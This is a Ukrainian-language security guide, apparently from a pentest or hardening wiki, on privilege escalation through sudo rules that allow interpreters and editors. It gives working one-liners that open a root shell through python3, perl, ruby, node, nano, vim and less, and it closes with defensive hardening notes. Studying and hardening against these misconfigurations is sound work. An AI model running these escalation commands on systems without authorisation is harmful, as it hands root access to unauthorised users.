## Інтерпретатори, дозволені через Sudo

Якщо `sudo -l` дозволяє користувачу запускати інтерпретатор від імені root, розглядайте це як пряме виконання коду. Інтерпретатори призначені для виконання довільного коду, тому правило, яке дозволяє запускати `python3`, `perl`, `ruby`, `lua`, `node` або подібні бінарні файли, зазвичай еквівалентне виконанню команд від імені root, якщо аргументи не обмежені та не перевіряються належним чином.

Типовий порядок перевірки:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Інші приклади інтерпретаторів:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Важливий точний шлях. Якщо правило sudo дозволяє `/usr/bin/python3`, використовуйте саме цей шлях під час перевірки:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors, дозволені через Sudo

Якщо `sudo -l` дозволяє користувачу запускати інтерактивний editor від імені root, розглядайте це як поверхню для виконання команд, а не як нешкідливий дозвіл на редагування файлів. Editors часто можуть виконувати shell-команди, читати довільні файли, записувати довільні файли або викликати зовнішні helpers безпосередньо з editor.

Типовий процес перевірки:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Виконання команд через Nano

Якщо `nano` дозволено через sudo, виконання команд може бути доступним з інтерфейсу редактора:
```text
Ctrl+R
Ctrl+X
```
Потім надайте команду, наприклад:
```bash
id
/bin/sh
```
На деяких терміналах інтерактивній оболонці може знадобитися перенаправлення стандартних потоків:
```bash
reset; /bin/sh 1>&0 2>&0
```
Точна послідовність клавіш може відрізнятися залежно від версії nano та параметрів збірки, але проблема безпеки залишається тією самою: редактор працює від імені root і може викликати зовнішні команди.

### Інші поширені способи виходу з редактора

Редактори у стилі Vim зазвичай надають виконання команд через `:!`:
```text
:!/bin/sh
```
Пейджери, такі як `less`, також можуть надавати можливість виконувати команди оболонки:
```text
!/bin/sh
```
## Захисні примітки

- Уникайте надання інтерпретаторів або інтерактивних редакторів через sudo.
- Надавайте перевагу фіксованим обгорткам, власником яких є root, що виконують одну вузьку адміністративну дію.
- Якщо інтерпретатор неминучий, обмежте точний шлях до скрипта та забороніть керовані користувачем аргументи, доступні для запису імпорти, `PYTHONPATH` і небезпечне збереження середовища.
- Якщо потрібне редагування файлів, обмежте точний шлях до файлу та розгляньте використання `sudoedit` із виправленими версіями sudo і суворим керуванням середовищем.
- Перевірте `SETENV`, `env_keep`, робочі каталоги, доступні для запису, шляхи до модулів/імпортів, доступні для запису, `NOEXEC`, `use_pty` і журналювання, але не вважайте їх повноцінною пісочницею.
